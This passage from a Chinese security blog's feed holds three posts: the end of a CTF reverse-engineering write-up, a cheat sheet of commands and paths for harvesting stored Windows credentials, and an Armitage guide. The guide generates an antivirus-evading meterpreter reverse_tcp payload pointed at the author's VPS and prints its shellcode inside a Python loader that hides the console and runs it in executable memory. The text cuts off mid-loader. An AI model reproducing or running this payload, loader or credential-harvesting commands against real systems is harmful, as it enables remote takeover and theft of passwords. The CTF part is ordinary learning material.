<h3 id="顺藤摸瓜"><a href="#顺藤摸瓜" class="headerlink" title="顺藤摸瓜"></a>顺藤摸瓜</h3><p><a href="http://pan.baidu.com/s/1c2jCC4C" target="_blank" rel="external">附件链接</a>： 密码：bdgn<br>老套路IDA F5大法。<br><img src="http://i4.buimg.com/588926/aa2c430d08fab294.png" alt=""><br>先一句一句来看吧<br><code>s</code>给的空间住够大，104个字符。<br><code>fgets()函数</code>是读取文件字符串，<br><code>srand函数</code>是随机数发生器的初始化函数。原型：void srand(unsigned int seed);<br>在C语言中中，<code>unsigned int</code>类型数据所占字节数跟和机器字长及编译器有关系。<br>这<code>main函数</code>主要是读取用户输入，类型转换作为随机数序列的种子，两次自定义的encode函数，最后输出encode结果。</p>
<h4 id="encode1"><a href="#encode1" class="headerlink" title="encode1"></a>encode1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">size_t __fastcall sub_400796(const char *a1)</div><div class="line">&#123;</div><div class="line">  size_t result; // rax@11</div><div class="line">  signed int i; // [sp+18h] [bp-18h]@1</div><div class="line">  signed int k; // [sp+18h] [bp-18h]@7</div><div class="line">  signed int j; // [sp+1Ch] [bp-14h]@2</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 25; ++i )</div><div class="line">  &#123;</div><div class="line">    for ( j = 0; j &lt;= 25; ++j )</div><div class="line">      *(&amp;byte_6010C0[26 * i] + j) = (i + j) % 26 + 97;</div><div class="line">  &#125;</div><div class="line">  for ( k = 0; ; ++k )</div><div class="line">  &#123;</div><div class="line">    result = strlen(a1);</div><div class="line">    if ( k &gt;= result )</div><div class="line">      break;</div><div class="line">    if ( (*__ctype_b_loc())[a1[k]] &amp; 0x200 )</div><div class="line">      a1[k] = *(&amp;byte_6010C0[26 * ((a1[k] - 97) % 26)] + (byte_601070[(signed __int64)(k % 26)] - 97) % 26);</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>byte_6010C0的内容为空。<br><img src="http://i1.piimg.com/588926/17573547a25189b6.png" alt=""><br>byte_601070的内容为<code>qwertyuiopaasdfghjklzxcvbnm</code><br><img src="http://i1.piimg.com/588926/375c2016f855a3ad.png" alt=""><br>而第一个for生成了一个表，第二个for是表对应位置加上一个数。</p>
<h4 id="encode2"><a href="#encode2" class="headerlink" title="encode2"></a>encode2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall sub_400937(const char *a1)</div><div class="line">&#123;</div><div class="line">  int v1; // eax@7</div><div class="line">  int v2; // ebx@8</div><div class="line">  char v4; // [sp+1Bh] [bp-F5h]@3</div><div class="line">  signed int i; // [sp+1Ch] [bp-F4h]@1</div><div class="line">  int j; // [sp+20h] [bp-F0h]@2</div><div class="line">  int v7; // [sp+24h] [bp-ECh]@1</div><div class="line">  unsigned int v8; // [sp+28h] [bp-E8h]@1</div><div class="line">  int v9; // [sp+2Ch] [bp-E4h]@1</div><div class="line">  char src[200]; // [sp+30h] [bp-E0h]@7</div><div class="line">  __int64 v11; // [sp+F8h] [bp-18h]@1</div><div class="line"></div><div class="line">  v11 = *MK_FP(__FS__, 40LL);</div><div class="line">  v7 = 0;</div><div class="line">  v8 = rand() % 7 + 2;</div><div class="line">  v9 = strlen(a1) / (signed int)v8 + 1;</div><div class="line">  for ( i = 0; i &lt; (signed int)v8; ++i )</div><div class="line">  &#123;</div><div class="line">    for ( j = 0; j &lt; v9; ++j )</div><div class="line">    &#123;</div><div class="line">      v4 = a1[v8 * j + i];</div><div class="line">      if ( (*__ctype_b_loc())[v4] &amp; 0x200 || v4 == 123 || v4 == 125 || v4 == 95 )</div><div class="line">      &#123;</div><div class="line">        v1 = v7++;</div><div class="line">        src[v1] = v4;</div><div class="line">      &#125;</div><div class="line">      else</div><div class="line">      &#123;</div><div class="line">        v2 = v7++;</div><div class="line">        src[v2] = rand() % 26 + 97;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  src[v7] = 0;</div><div class="line">  strcpy((char *)a1, src);</div><div class="line">  return *MK_FP(__FS__, 40LL) ^ v11;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个就不懂了。队友做。</p>
<p><a href="http://pan.baidu.com/s/1gfEECtP" target="_blank" rel="external">exp地址链接 </a>密码：6v9j</p>
<p>flag{decrypt_game_is_very_very_interesting}</p>
<p>做<code>Reverse</code>最大的感受就是：当初怎么没把<code>C语言</code>给学好呢。</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p><a href="http://pan.baidu.com/s/1i4PPDAX" target="_blank" rel="external">附件链接</a>： 密码：of1u<br><a href="http://pan.baidu.com/s/1hsabgUg" target="_blank" rel="external">exp链接</a>： 密码：blfw<br><img src="https://ooo.0o0.ooo/2017/05/15/59197bc6376dc.png" alt="Capture.PNG"></p>
<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p><a href="http://pan.baidu.com/s/1jHDCyGI" target="_blank" rel="external">附件链接</a>： 密码：cgvp<br><a href="http://pan.baidu.com/s/1o7IoxlC" target="_blank" rel="external">exp链接</a>： 密码：z8xb<br>flag{SF#PWN2Hd93DxnsE}</p>
<h2 id="没有过程的不打算补了，好废时间。"><a href="#没有过程的不打算补了，好废时间。" class="headerlink" title="没有过程的不打算补了，好废时间。"></a>没有过程的不打算补了，好废时间。</h2><h2 id="没有misc400的wp都不是好wp。"><a href="#没有misc400的wp都不是好wp。" class="headerlink" title="没有misc400的wp都不是好wp。"></a>没有misc400的wp都不是好wp。</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF的启蒙ISCC-2017开始了。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://rcoil.me/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://rcoil.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Pentest中需要注意的本地凭证</title>
    <link href="http://rcoil.me/2017/04/Pentest%E4%B8%AD%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%87%AD%E8%AF%81/"/>
    <id>http://rcoil.me/2017/04/Pentest中需要注意的本地凭证/</id>
    <published>2017-04-20T07:17:20.000Z</published>
    <updated>2017-08-01T15:56:35.556Z</updated>
    
    <content type="html"><![CDATA[<p>收集主机中的和密码凭证的相关内容<br><a id="more"></a></p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>Windows 自动部署过程中的一些凭证（base64）存储位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\unattend.xml</div><div class="line">C:\Windows\Panther\Unattend.xml</div><div class="line">C:\Windows\Panther\Unattend\Unattend.xml</div><div class="line">C:\Windows\system32\sysprep.inf</div><div class="line">C:\Windows\system32\sysprep\sysprep.xml</div></pre></td></tr></table></figure></p>
<p>使用 Metasploit 的post/windows/gather/enum_unattend模块也可以获取到</p>
<p>IIS 管理凭证的 web.config 文件常见路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</div><div class="line">C:\inetpub\wwwroot\web.config</div></pre></td></tr></table></figure></p>
<p>文件内容示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;configuration&gt;</div><div class="line">&lt;system.web&gt;</div><div class="line">&lt;authentication mode=&quot;Windows&quot;&gt;</div><div class="line">&lt;forms&gt;</div><div class="line">&lt;credentials passwordFormat=&quot;Clear&quot;&gt;</div><div class="line">&lt;user name=&quot;Admin&quot; password=&quot;Admin&quot; /&gt;</div><div class="line">&lt;/credentials&gt;</div><div class="line">&lt;/forms&gt;</div><div class="line">&lt;/authentication&gt;</div><div class="line">&lt;/system.web&gt;</div><div class="line">&lt;/configuration&gt;</div></pre></td></tr></table></figure></p>
<p>包含密码的 groups.xml 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml</div><div class="line">\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml</div></pre></td></tr></table></figure></p>
<p>这个文件每个域用户都可以读取。文件中的密码是加密的，但是Microsoft已经发布了密钥，可以对其进行解密。</p>
<p>其他一些可能存储凭证的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Services\Services.xml</div><div class="line">ScheduledTasks\ScheduledTasks.xml</div><div class="line">Printers\Printers.xml</div><div class="line">Drives\Drives.xml</div><div class="line">DataSources\DataSources.xml</div></pre></td></tr></table></figure></p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="使用命令查找包含密码的文件："><a href="#使用命令查找包含密码的文件：" class="headerlink" title="使用命令查找包含密码的文件："></a>使用命令查找包含密码的文件：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div></pre></td></tr></table></figure>
<h3 id="查找文件的位置："><a href="#查找文件的位置：" class="headerlink" title="查找文件的位置："></a>查找文件的位置：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">C:\&gt; dir /b /s unattend.xml</div><div class="line">C:\&gt; dir /b /s web.config</div><div class="line">C:\&gt; dir /b /s sysprep.inf</div><div class="line">C:\&gt; dir /b /s sysprep.xml</div><div class="line">C:\&gt; dir /b /s *pass*</div><div class="line">C:\&gt; dir /b /s vnc.ini</div></pre></td></tr></table></figure>
<h2 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h2><h3 id="McAfee"><a href="#McAfee" class="headerlink" title="McAfee"></a>McAfee</h3><p>很多windows喜欢使用McAfee保护电脑，McAfee 的加密凭证存储在 sitelist.xml 文件中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml</div></pre></td></tr></table></figure></p>
<h2 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h2><h3 id="UltraVNC"><a href="#UltraVNC" class="headerlink" title="UltraVNC"></a>UltraVNC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">passwd=5FAEBBD0EF0A2413</div></pre></td></tr></table></figure>
<h3 id="RealVNC"><a href="#RealVNC" class="headerlink" title="RealVNC"></a>RealVNC</h3><p>RealVNC 的密码可以直接在注册表进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password</div></pre></td></tr></table></figure></p>
<h3 id="Putty"><a href="#Putty" class="headerlink" title="Putty"></a>Putty</h3><p>PUTTY的明文密码可以在下注册表项中查找：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query&quot; HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</div></pre></td></tr></table></figure></p>
<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>Registry 某些情况下可能会包含凭证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM /f password /t REG_SZ /s</div><div class="line">reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure></p>
<p>Windows 自动登陆：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</div></pre></td></tr></table></figure></p>
<p>SNMP 相关参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</div></pre></td></tr></table></figure></p>
<h2 id="PowerSploit-相关的模块"><a href="#PowerSploit-相关的模块" class="headerlink" title="PowerSploit 相关的模块"></a>PowerSploit 相关的模块</h2><p>PowerSploit 也可以用于发现存储的凭证，以下模块支持检查各种文件和注册表中的加密凭证和 plain-text：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Get-UnattendedInstallFile</div><div class="line">Get-Webconfig</div><div class="line">Get-ApplicationHost</div><div class="line">Get-SiteListPassword</div><div class="line">Get-CachedGPPPassword</div><div class="line">Get-RegistryAutoLogon</div></pre></td></tr></table></figure></p>
<p>参考：<a href="https://pentestlab.blog/2017/04/19/stored-credentials/" target="_blank" rel="external">Stored Credentials</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;收集主机中的和密码凭证的相关内容&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="内网" scheme="http://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="本地凭证" scheme="http://rcoil.me/tags/%E6%9C%AC%E5%9C%B0%E5%87%AD%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>Armitage使用</title>
    <link href="http://rcoil.me/2017/04/armitage%E4%BD%BF%E7%94%A8/"/>
    <id>http://rcoil.me/2017/04/armitage使用/</id>
    <published>2017-04-17T09:49:26.000Z</published>
    <updated>2017-08-01T15:53:37.723Z</updated>
    
    <content type="html"><![CDATA[<p>一直想搞一波事情<br><a id="more"></a></p>
<h2 id="初次使用armitage"><a href="#初次使用armitage" class="headerlink" title="初次使用armitage"></a>初次使用armitage</h2><h3 id="启动postgresql"><a href="#启动postgresql" class="headerlink" title="启动postgresql"></a>启动postgresql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service postgresql start</div></pre></td></tr></table></figure>
<h3 id="切换postgres用户"><a href="#切换postgres用户" class="headerlink" title="切换postgres用户"></a>切换postgres用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su postgres</div></pre></td></tr></table></figure>
<p>输入命令创建一个postgresql数据库账户:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">createuser msf1 -P</div></pre></td></tr></table></figure></p>
<p>提示输入密码。</p>
<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>owner参数指定数据库的所有者，最后一个参数为数据库名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">createdb --owner=msf1 msf1</div></pre></td></tr></table></figure></p>
<h3 id="启动Metasploit"><a href="#启动Metasploit" class="headerlink" title="启动Metasploit"></a>启动Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@RcoIl:~# msfconsole</div></pre></td></tr></table></figure>
<p>连接数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf &gt; db_connect msf1:msf1@localhost/msf1</div></pre></td></tr></table></figure></p>
<h3 id="启动armitage"><a href="#启动armitage" class="headerlink" title="启动armitage"></a>启动armitage</h3><p><img src="http://i1.piimg.com/567571/f11b22a7d7fe81d0.png" alt=""></p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>将vps上8888端口的流量转发到6665端口。而本地连接vps上的6665端口即可。<br><img src="http://i4.buimg.com/567571/9d86d7ff40b7de19.png" alt=""></p>
<h2 id="生成免杀exe"><a href="#生成免杀exe" class="headerlink" title="生成免杀exe"></a>生成免杀exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">root@RcoIl:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=8888 LHOST=139.199.xxx.xxx -e x86/shikata_ga_nai -i 11 -f py -o /root/rcoil.py</div><div class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</div><div class="line">No Arch selected, selecting Arch: x86 from the payload</div><div class="line">Found 1 compatible encoders</div><div class="line">Attempting to encode payload with 11 iterations of x86/shikata_ga_nai</div><div class="line">x86/shikata_ga_nai succeeded with size 360 (iteration=0)</div><div class="line">x86/shikata_ga_nai succeeded with size 387 (iteration=1)</div><div class="line">x86/shikata_ga_nai succeeded with size 414 (iteration=2)</div><div class="line">x86/shikata_ga_nai succeeded with size 441 (iteration=3)</div><div class="line">x86/shikata_ga_nai succeeded with size 468 (iteration=4)</div><div class="line">x86/shikata_ga_nai succeeded with size 495 (iteration=5)</div><div class="line">x86/shikata_ga_nai succeeded with size 522 (iteration=6)</div><div class="line">x86/shikata_ga_nai succeeded with size 549 (iteration=7)</div><div class="line">x86/shikata_ga_nai succeeded with size 576 (iteration=8)</div><div class="line">x86/shikata_ga_nai succeeded with size 603 (iteration=9)</div><div class="line">x86/shikata_ga_nai succeeded with size 630 (iteration=10)</div><div class="line">x86/shikata_ga_nai chosen with final size 630</div><div class="line">Payload size: 630 bytes</div><div class="line">Final size of py file: 3020 bytes</div><div class="line">Saved as: /root/rcoil.py</div></pre></td></tr></table></figure>
<p>将生成得rcoil.py进行改写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line">from ctypes import *</div><div class="line">import ctypes</div><div class="line">buf =  &quot;&quot;</div><div class="line">buf += &quot;\xda\xc2\xb8\x5a\xb8\x23\x52\xd9\x74\x24\xf4\x5b\x2b&quot;</div><div class="line">buf += &quot;\xc9\xb1\x97\x31\x43\x1a\x83\xc3\x04\x03\x43\x16\xe2&quot;</div><div class="line">buf += &quot;\xaf\x63\xfc\x8b\x3b\xb0\xf7\x94\x6d\xde\x62\x60\x2a&quot;</div><div class="line">buf += &quot;\x36\x44\xd8\x5d\x79\x15\x0c\xde\x91\x65\x31\x0d\x10&quot;</div><div class="line">buf += &quot;\xe1\x47\xe7\x77\xc0\x18\xf7\x11\x54\xc4\x1b\x10\x6f&quot;</div><div class="line">buf += &quot;\xb3\xc4\xac\x3a\xc6\x0c\xf4\x4a\x39\x28\x85\x7f\xd7&quot;</div><div class="line">buf += &quot;\xc6\x28\x9d\xae\x34\x11\x7b\x59\x26\xb3\xbf\xca\xf7&quot;</div><div class="line">buf += &quot;\xa3\x77\x33\x9c\x9f\x29\x4b\xf9\xa7\x2f\x12\xfb\x2f&quot;</div><div class="line">buf += &quot;\xea\x3f\x22\xa2\x42\x5b\xc5\xc5\xb8\xda\x28\x03\x3a&quot;</div><div class="line">buf += &quot;\xf6\x3f\x8b\x43\x91\x73\x78\x38\x92\x99\x1b\x07\x2c&quot;</div><div class="line">buf += &quot;\x77\xe7\xde\xf3\xc4\xf9\x10\xfd\xae\x88\x00\xf2\x79&quot;</div><div class="line">buf += &quot;\xac\x2a\x07\x25\x96\xbd\x31\xe0\xff\xef\xc9\xc3\xea&quot;</div><div class="line">buf += &quot;\x3b\xcc\x0a\x00\x27\x43\xa4\x60\x1f\x3c\x5b\xc4\xa0&quot;</div><div class="line">buf += &quot;\x46\x65\xf1\xfc\x82\x8e\x10\x97\x1e\x05\x1e\x76\xae&quot;</div><div class="line">buf += &quot;\xc7\xe3\xad\xe0\x09\x5a\x0a\x2a\x04\x9e\x71\x86\x23&quot;</div><div class="line">buf += &quot;\xe0\x81\x63\x6f\x75\xca\xda\x24\x66\xbe\x4b\xb9\x3d&quot;</div><div class="line">buf += &quot;\x98\x78\xfe\xd8\x3c\x3c\x87\x3d\x61\x48\xc7\xf4\x67&quot;</div><div class="line">buf += &quot;\x59\x1e\x79\xf6\xf8\x71\xeb\x5a\xbb\x20\xb7\x2b\xd6&quot;</div><div class="line">buf += &quot;\x26\xf6\x77\x6d\xd4\x33\x90\x42\x9c\xff\xef\x44\xb7&quot;</div><div class="line">buf += &quot;\x1a\xec\x6a\xa6\x66\x6d\x1f\xaa\xdb\x84\x80\x68\xc4&quot;</div><div class="line">buf += &quot;\x47\x96\xf4\x09\x15\xff\x0f\xff\xb9\x0c\x8e\x5c\xbe&quot;</div><div class="line">buf += &quot;\x44\x93\xa4\x7c\xcd\x7f\x0c\x57\x24\xd4\x83\x89\xef&quot;</div><div class="line">buf += &quot;\x03\x80\x79\xfd\x83\x33\x85\x76\x50\xa8\xae\x17\x03&quot;</div><div class="line">buf += &quot;\x91\xc2\x66\x71\x72\x1e\x25\x35\x7d\xd7\x8b\x2c\xe5&quot;</div><div class="line">buf += &quot;\x57\xc9\xce\xb2\xaa\xe3\xbb\x71\xb5\x23\x45\xa3\x90&quot;</div><div class="line">buf += &quot;\xbb\xfb\xa0\x07\xaa\x1c\xf7\xd0\x34\x24\xa9\xb1\x8e&quot;</div><div class="line">buf += &quot;\xbd\x7c\x52\xa8\xe1\x70\x25\xf4\x57\x90\x69\xf1\xfb&quot;</div><div class="line">buf += &quot;\xc2\x44\xac\xa9\xb4\x6d\x84\xfb\x05\x7d\x3b\xfb\x70&quot;</div><div class="line">buf += &quot;\xa0\x03\x90\xe5\xcf\x77\x3e\xb9\x39\x44\x1e\xa1\x8d&quot;</div><div class="line">buf += &quot;\x55\x44\x3a\xf7\x8e\xe4\x35\x64\xd7\x63\xcb\xc3\x3d&quot;</div><div class="line">buf += &quot;\x48\xb3\xaa\x67\xe3\x17\xc1\xaa\x4c\x62\x6a\x4e\xfb&quot;</div><div class="line">buf += &quot;\x2e\x16\x70\xa3\xc9\x70\xfa\x0e\x7e\xea\xc3\xf3\x9b&quot;</div><div class="line">buf += &quot;\x9a\xed\x9a\xbe\xcd\x32\xc6\x66\x80\xb0\x92\x20\x55&quot;</div><div class="line">buf += &quot;\x58\x1e\x5b\xbf\x7f\x54\x7d\x64\xe3\x9b\x81\xd3\x25&quot;</div><div class="line">buf += &quot;\x65\x2c\x42\xd0\xc3\x07\x5f\xa3\x12\x75\x5a\xcf\x52&quot;</div><div class="line">buf += &quot;\x62\xf2\xa8\xe0\xcf\x93\x2f\x1b\xb6\x2c\x18\x0e\x0e&quot;</div><div class="line">buf += &quot;\x42\xaa\xd8\x3b\x01\x1b\x7d\x04\x78\x42\x10\x40\x83&quot;</div><div class="line">buf += &quot;\xce\xf2\xb4\x2b\x42\xd9\xf6\x84\xa7\xd4\xb3\x2d\x78&quot;</div><div class="line">buf += &quot;\xb0\x18\xa0\x9c\xfa\x23\xd1\xd7\x65\x36\xf4\x26\xaa&quot;</div><div class="line">buf += &quot;\x5e\x29\xb8\xdc\x0e\x84\xef\xc0\x71\xbf\xce\x24\xb0&quot;</div><div class="line">buf += &quot;\x10\x03\x95\x90\x03\x58\xde\x52\x6f\x37\xc4\x5c\xe7&quot;</div><div class="line">buf += &quot;\x43\x27\x0a\xa7\xa5\x20\xa5\xab\x73\x70\x03\x48\xab&quot;</div><div class="line">buf += &quot;\x8c\x67\x09\xbc\xec\xd4\x04\x70\xe9\xda\x9e\xe2\xb9&quot;</div><div class="line">buf += &quot;\xac\xa3\xd6\x65\xd2\xec\x52\x4c\xbe\x8e\x0d\x27\xa1&quot;</div><div class="line">buf += &quot;\x67\xc2\x9c\x34\x71\xf3\x0c\x7e\xec\x6c\x4f\x98\xb9&quot;</div><div class="line">buf += &quot;\xe7\x1c\x24\x2e\x68\xc8\x59\xa2\xdc\x7f\xeb\x41\x19&quot;</div><div class="line">buf += &quot;\x4e\x61\x1e\x9f\xd7\xfb\xb7\x3a\xf0\xbb\xb4\x33\xcf&quot;</div><div class="line">buf += &quot;\xf9\xb2\xa1\xe9\x67\x0f\x4c\x88\x7d\xc5\x90\x74\xf2&quot;</div><div class="line">buf += &quot;\x5a\xd4\x25\xca\xaa\x63&quot;</div><div class="line"> </div><div class="line">#libc = CDLL(&apos;libc.so.6&apos;)</div><div class="line">PROT_READ = 1</div><div class="line">PROT_WRITE = 2</div><div class="line">PROT_EXEC = 4</div><div class="line">def executable_code(buffer):</div><div class="line">    buf = c_char_p(buffer)</div><div class="line">    size = len(buffer)</div><div class="line">    addr = libc.valloc(size)</div><div class="line">    addr = c_void_p(addr)</div><div class="line">    if 0 == addr:  </div><div class="line">        raise Exception(&quot;Failed to allocate memory&quot;)</div><div class="line">    memmove(addr, buf, size)</div><div class="line">    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</div><div class="line">        raise Exception(&quot;Failed to set protection on buffer&quot;)</div><div class="line">    return addr</div><div class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</div><div class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</div><div class="line">shellcode = bytearray(buf)</div><div class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()    </div><div class="line">if whnd != 0:</div><div class="line">	if 666==666:</div><div class="line">		ctypes.windll.user32.ShowWindow(whnd, 0)    </div><div class="line">		ctypes.windll.kernel32.CloseHandle(whnd)</div><div class="line">print &quot;..................................&quot;*666</div><div class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</div><div class="line">                                          ctypes.c_int(len(shellcode)),</div><div class="line">                                          